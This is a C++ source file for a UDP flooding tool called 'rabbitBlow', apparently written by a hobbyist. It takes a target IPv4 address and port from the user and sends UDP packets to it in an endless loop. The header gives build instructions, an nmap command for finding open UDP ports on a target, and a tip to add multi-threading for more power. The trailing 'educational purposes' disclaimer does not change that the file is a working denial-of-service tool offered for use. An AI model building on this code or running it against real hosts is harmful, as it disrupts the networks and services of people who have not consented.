
/* 

    @author Mousymous
    
    Created By Mousymous at November 14 2024 - November 16 2024.
    The whole code is hand written and developed so by mousymous so bugs and mistakes are visible.
    You can modify the program to make it even better.

    Issues: 

        Unfinished missing multi-threading, but it is working. (multi-threading is needed)
        Very weak, needs open UDP ports to work and often causes Low to None damage on a Network.
        If supplied with incorrect Input, The program will just Kicks you out or cause undefined behaviours.
        Error messages aren't informative enough so you gotta dig deeper if errors is encountered.

        Overall unfinished, unoptimized and Buggy but it works!.


    Destructive power: 
        
        Low.
        Add multi-threadin to DESTROY() function if you want it powerful lol.

    How to Build:

        Can only work in Linux and not tested for Windows Operating System.
        compile the program with g++ make sure to add optimization flag and use C++20 and pedantic errors enabled
            
        suggested compilation build:

            g++ rabbitBlow.cpp name.cpp -o rabbit-blow.exe -pedantic-errors -O3 -std=c++20

        Add this flags to enable warnings: 

            -Wall -Wextra -Weffc++ -Wconversion 
    
    How to use:

        Supply the First input with an IP address that is IPv4 version, IPv6 IP Addresses won't work
        Supply the second input with an open UDP port number

    Tips:

        Use nmap tool to check if an UDP port is open, make sure you are using sudo privilages

        Command: 

            sudo nmap -sU ( ip_target )

    Warning:

        If no open UDP port is found it won't really work and even if there's an open port
        it's not guranteed that it will work because of firewalls.

    ! I'm jut also Learning. !

*/

#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <limits>
#include <thread>
#include "textcolors.h"

#define COLOR REDHB

// Structure to hold socket information
struct SocketInfo {
    int socket; // The socket file descriptor
};

// Structure to hold user-inputted target data (IP address and port)
struct StoredData {
    std::string targetIpAddress; // Target IP address to connect to
    int targetPortNumber; // Target port number to connect to
};

// Class to display the logo of the tool
class DisplayLogo {
    public:
        // Constructor that takes the tool's name as an argument
        DisplayLogo(const std::string& toolName) {
            DisplayToolName(toolName); // Calls the DisplayToolName method to display the tool's name
        }
    
        // Method to display the tool's name
        void DisplayToolName(const std::string& toolName) {
            std::cout << toolName; // Outputs the tool's name
        }
};

// Class to handle user input for the target IP address and port
class UserInput {
    public:
        // Constructor to initialize and get user input
        UserInput(struct StoredData& storedDataObj) {
            getUserInput(storedDataObj); // Calls the getUserInput method to get the target IP and port
        };

        // Checks if the input is valid
        void checkValidInput() {
            if (std::cin.fail()) { // If there is an input failure
                std::cerr << BRED "Invalid Input!!"; // Display error message in red
                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // Clear the input buffer
                std::cin.clear(); // Reset the input stream state
                exit(EXIT_FAILURE); // Exit the program with failure status
            }
        }

        // Prompts the user to enter the target port number
        int getPortTarget() {
            int input { 0 };
            std::cout << COLOR "Enter Target Port Number: " reset; // Displays the prompt
            std::cin >> input; 
            std::cin.ignore(); // Clears any extra input
            checkValidInput(); // Validates the input
            return input; // Returns the user input for port number
        }

        // Prompts the user to enter the target IP address
        std::string getIpTarget() {
            std::string input{ "" };
            std::cout << COLOR "Enter Target IP: " reset; // Displays the prompt
            std::getline(std::cin, input); // Reads the full line of input
            checkValidInput(); // Validates the input
            return input; // Returns the user input for IP address
        }

        // Method to get both the target IP address and port number from the user
        void getUserInput(struct StoredData& storedDataObj) {
            storedDataObj.targetIpAddress = getIpTarget(); // Sets the IP address
            storedDataObj.targetPortNumber = getPortTarget(); // Sets the port number
        }
};

// Class to configure the socket and prepare it for communication
class SocketConfig {
    public:
        // Constructor that initializes the socket and binds it to the target IP and port
        SocketConfig(struct SocketInfo& socketInfoObj, struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {
            socketInitialization(socketInfoObj.socket); // Calls socket initialization
            socketBind(servaddr, storedDataObj); // Binds the socket to the target IP and port
        }

        // Initializes the socket for communication
        void socketInitialization(int& sockfd) {
            if ( (sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0 ) {
                std::cerr << BRED "Socket failed to initialize" << std::endl; // Displays error if socket creation fails
                exit(EXIT_FAILURE); // Exit program with failure
            }
        }

        // Binds the socket to the target IP address and port number
        void socketBind(struct sockaddr_in& servaddr, struct StoredData& storedDataObj) {
            memset(&servaddr, 0, sizeof(servaddr)); // Clears memory for sockaddr_in structure
            servaddr.sin_family = AF_INET; // Sets the socket family to IPv4
            servaddr.sin_port = htons(static_cast<uint16_t>(storedDataObj.targetPortNumber)); // Sets the target port (converted to network byte order)

            // Converts the target IP address from text to binary format
            if(inet_pton(AF_INET, storedDataObj.targetIpAddress.c_str(), &servaddr.sin_addr) <= 0) {
                std::cerr << BRED "Invalid IP Address Format" << std::endl; // Error if IP format is invalid
                exit(EXIT_FAILURE); // Exit the program with failure
            }

            std::cout << "Working!!" << std::endl; // Confirmation message
        }
};

/*
    ! The Attack Begins Here (unimplemented multi-threading in the 'DESTROY' function)

    This class performs the destructive operation (attack), sending UDP packets to the target IP.
*/ 
class Kill_em_ALL {
    public:
        // Constructor that starts the destructive operation
        Kill_em_ALL(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {
            DESTROY(sockInfoObj, servaddr); // Calls the DESTROY method to initiate the attack
        }
        
        // Method to send destructive packets to the target continuously
        void DESTROY(struct SocketInfo& sockInfoObj, struct sockaddr_in& servaddr) {    
            std::string data_to_transfer = "RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"; // Message to send

            while (true) {
                // Sends the message to the target IP and port
                ssize_t byteSent = sendto(sockInfoObj.socket, data_to_transfer.c_str(), data_to_transfer.size(), 0,
                                          (struct sockaddr *)&servaddr, sizeof(servaddr));

                if (byteSent < 0) { // If message sending fails
                    std::cerr << BRED "Failed to send message! Error: " << strerror(errno) << std::endl; // Error message
                    close(sockInfoObj.socket); // Closes the socket
                    exit(EXIT_FAILURE); // Exit with failure
                }

                // Displays the attack progress message
                std::cout << BRED" ThE RaBBiTs " BBLU "ArE On " BYEL " To BrEaK ThE " BMAG " SYsTEm! "<< std::endl;
            }

            close(sockInfoObj.socket); // Closes the socket after the loop
        }
};

// Main function to start the program
int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {
    extern const std::string toolName; // External variable for the tool name

    struct sockaddr_in servaddr; // Address structure for the target

    struct SocketInfo socketInfoObj = { 0 }; // Initializes the socket info structure
    struct StoredData storedDataObj = { " " , 0 }; // Initializes the stored data structure with default values

    // Display tool name (logo)
    DisplayLogo displayLogoObj(toolName); 

    // Get user input for target IP and port
    UserInput userInputObj(storedDataObj); 

    // Configure the socket for communication
    SocketConfig socketConfigObj(socketInfoObj, servaddr, storedDataObj); 

    // Start the destructive operation
    Kill_em_ALL(socketInfoObj, servaddr);

    return EXIT_SUCCESS; // Exit the program with success
}

/* 
    This program simulates a network attack using UDP packets. It is designed for educational purposes only. 

    **How the program works:**
    
    Display the Tool's Logo:

       - The program starts by displaying the name of the tool (or logo) using the `DisplayLogo` class. The logo is displayed via the `DisplayToolName()` method in this class, which outputs the tool name to the console.

    User Input (Target IP and Port:

       - The `UserInput` class handles collecting the target IP address and port number from the user. The constructor calls the `getUserInput()` method, which internally calls two methods:
         - `getIpTarget()`: Asks the user to input the target IP address (e.g., "192.168.1.1").
         - `getPortTarget()`: Asks the user to input the target port number (e.g., "8080").
       - Both methods ensure that the input is valid by calling `checkValidInput()`. If invalid input is detected (e.g., a non-numeric value when a number is expected), an error message is displayed, and the program exits.

    Socket Initialization:


       - The `SocketConfig` class is responsible for setting up the network socket. The constructor of this class initializes the socket using the `socketInitialization()` method, which calls the system call `socket()` to create a UDP socket.
       - If socket creation fails, an error message is displayed, and the program exits. The `socket()` function is used here to set up a socket for **UDP communication** (`SOCK_DGRAM`).

    Binding the Socket:

       - After the socket is created, the `socketBind()` method configures the socket with the target IP address and port. It uses the `inet_pton()` function to convert the target IP address from text to binary format (network byte order).
       - The `htons()` function is used to convert the target port number into the proper network byte order.
       - The socket is not explicitly bound to a local address since this is a **client-side operation**, and binding is unnecessary for UDP in this case.

    Starting the Attack (Send UDP Packets):


       - The `Kill_em_ALL` class simulates a **denial-of-service (DoS) attack** by continuously sending UDP packets to the target using the `sendto()` system call.
       - The attack message `"RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"` is sent in each UDP packet.
       - The `DESTROY()` method continuously loops, sending the packet to the target address (`servaddr`) using the socket created earlier. If sending the packet fails (e.g., due to a network error), an error message is displayed, and the socket is closed.
       - The loop continues indefinitely, sending the message and printing progress output to the console. The message simulates an attack with some playful text (e.g., "ThE RaBBiTs ArE On To BrEaK ThE SyStEm!").

    Program Execution Flow:

       - The program starts by displaying the logo, then asks the user for the target IP and port.
       - It initializes a socket and configures it to communicate with the target IP and port.
       - Finally, it starts the attack by continuously sending the UDP packets to the target.

    Main Points to Note:

    - This program uses the `sendto()` function to send UDP packets. Since UDP is connectionless, the program does not establish a connection with the target before sending data.
    - The socket is set to use IPv4 (AF_INET) and UDP (SOCK_DGRAM).
    - The attack message is sent in a loop, simulating a DoS (Denial-of-Service) type of network attack. The message is hardcoded and does not actually perform any harmful activity besides flooding the target with packets.
    - The code handles errors such as invalid user input, socket creation failure, and failed packet transmission.

    Things to Remember:

    - The program is an example for understanding socket programming and how data can be sent over a network. **It is important to use this knowledge responsibly** and not for any malicious activity.
    - The program lacks **multi-threading** support for sending multiple instances of the message concurrently, which could improve performance in an actual attack scenario. For learning, this simple version can be further extended with threading or other features.
    - It is important to highlight that this is not a real DoS attack, and the code should only be run in a controlled and ethical environment for educational purposes.
*/
